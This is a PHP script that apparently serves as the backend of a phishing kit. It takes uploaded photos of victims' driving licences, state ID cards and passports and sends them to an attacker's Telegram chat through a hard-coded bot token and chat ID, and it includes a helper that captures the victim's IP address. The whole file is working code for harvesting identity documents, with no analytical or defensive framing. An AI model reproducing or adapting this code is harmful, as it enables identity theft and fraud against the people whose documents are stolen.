<?php 
function telegram($text){
    $chat_id='-1001744853686';
    $token='5830556594:AAFXPBVlWDI16vV171qn9xBivXQaGAQRkZQ';
    $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
    $ch=curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    $result=curl_exec($ch);
    curl_close($ch);
}

function get_client_ip() {
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }
    if( $ip == '::1' ) {
        return '127.0.0.1';
    }
    return  $ip;
}

// Send Images To Telegram :
$botToken = '5830556594:AAFXPBVlWDI16vV171qn9xBivXQaGAQRkZQ';
$chatId = '-1001744853686';

if (isset($_REQUEST['driving_license'])){
    // Check if a file was uploaded
    if (isset($_FILES['verification'])) {
        // Path to the uploaded image file
        $imagePath = $_FILES['verification']['tmp_name'];

        // URL for the Telegram Bot API sendPhoto method
        $url = 'https://api.telegram.org/bot' . $botToken . '/sendPhoto';

        // Create a cURL handle
        $curl = curl_init();

        // Set the cURL options
        curl_setopt_array($curl, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => array(
                'chat_id' => $chatId,
                'photo' => new CURLFile($imagePath, 'image/*')
            )
        ));

        // Execute the cURL request
        $response = curl_exec($curl);

        // Close the cURL handle
        curl_close($curl);

        // Handle the response
        if ($response === false) {
            echo 'Error sending the image.';
        } else {
            $responseData = json_decode($response, true);
            if ($responseData['ok']) {
                echo 'Image sent successfully.';
            } else {
                echo 'Error: ' . $responseData['description'];
            }
        }
    } else {
        echo 'Error uploading the image.';
    }

    // Check if a file was uploaded
    if (isset($_FILES['verification_2'])) {
        // Path to the uploaded image file
        $imagePath = $_FILES['verification_2']['tmp_name'];

        // URL for the Telegram Bot API sendPhoto method
        $url = 'https://api.telegram.org/bot' . $botToken . '/sendPhoto';

        // Create a cURL handle
        $curl = curl_init();

        // Set the cURL options
        curl_setopt_array($curl, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => array(
                'chat_id' => $chatId,
                'photo' => new CURLFile($imagePath, 'image/*')
            )
        ));

        // Execute the cURL request
        $response = curl_exec($curl);

        // Close the cURL handle
        curl_close($curl);

        // Handle the response
        if ($response === false) {
            echo 'Error sending the image.';
        } else {
            $responseData = json_decode($response, true);
            if ($responseData['ok']) {
                echo 'Image sent successfully.';
            } else {
                echo 'Error: ' . $responseData['description'];
            }
        }
    } else {
        echo 'Error uploading the image.';
    }
}

if (isset($_REQUEST['state_identity_card'])){
    // Check if a file was uploaded
    if (isset($_FILES['verification'])) {
        // Path to the uploaded image file
        $imagePath = $_FILES['verification']['tmp_name'];

        // URL for the Telegram Bot API sendPhoto method
        $url = 'https://api.telegram.org/bot' . $botToken . '/sendPhoto';

        // Create a cURL handle
        $curl = curl_init();

        // Set the cURL options
        curl_setopt_array($curl, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => array(
                'chat_id' => $chatId,
                'photo' => new CURLFile($imagePath, 'image/*')
            )
        ));

        // Execute the cURL request
        $response = curl_exec($curl);

        // Close the cURL handle
        curl_close($curl);

        // Handle the response
        if ($response === false) {
            echo 'Error sending the image.';
        } else {
            $responseData = json_decode($response, true);
            if ($responseData['ok']) {
                echo 'Image sent successfully.';
            } else {
                echo 'Error: ' . $responseData['description'];
            }
        }
    } else {
        echo 'Error uploading the image.';
    }

    // Check if a file was uploaded
    if (isset($_FILES['verification_2'])) {
        // Path to the uploaded image file
        $imagePath = $_FILES['verification_2']['tmp_name'];

        // URL for the Telegram Bot API sendPhoto method
        $url = 'https://api.telegram.org/bot' . $botToken . '/sendPhoto';

        // Create a cURL handle
        $curl = curl_init();

        // Set the cURL options
        curl_setopt_array($curl, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => array(
                'chat_id' => $chatId,
                'photo' => new CURLFile($imagePath, 'image/*')
            )
        ));

        // Execute the cURL request
        $response = curl_exec($curl);

        // Close the cURL handle
        curl_close($curl);

        // Handle the response
        if ($response === false) {
            echo 'Error sending the image.';
        } else {
            $responseData = json_decode($response, true);
            if ($responseData['ok']) {
                echo 'Image sent successfully.';
            } else {
                echo 'Error: ' . $responseData['description'];
            }
        }
    } else {
        echo 'Error uploading the image.';
    }
}

if (isset($_REQUEST['passport'])){
    // Check if a file was uploaded
    if (isset($_FILES['verification'])) {
        // Path to the uploaded image file
        $imagePath = $_FILES['verification']['tmp_name'];

        // URL for the Telegram Bot API sendPhoto method
        $url = 'https://api.telegram.org/bot' . $botToken . '/sendPhoto';

        // Create a cURL handle
        $curl = curl_init();

        // Set the cURL options
        curl_setopt_array($curl, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => array(
                'chat_id' => $chatId,
                'photo' => new CURLFile($imagePath, 'image/*')
            )
        ));

        // Execute the cURL request
        $response = curl_exec($curl);

        // Close the cURL handle
        curl_close($curl);

        // Handle the response
        if ($response === false) {
            echo 'Error sending the image.';
        } else {
            $responseData = json_decode($response, true);
            if ($responseData['ok']) {
                echo 'Image sent successfully.';
            } else {
                echo 'Error: ' . $responseData['description'];
            }
        }
    } else {
        echo 'Error uploading the image.';
    }
}
?>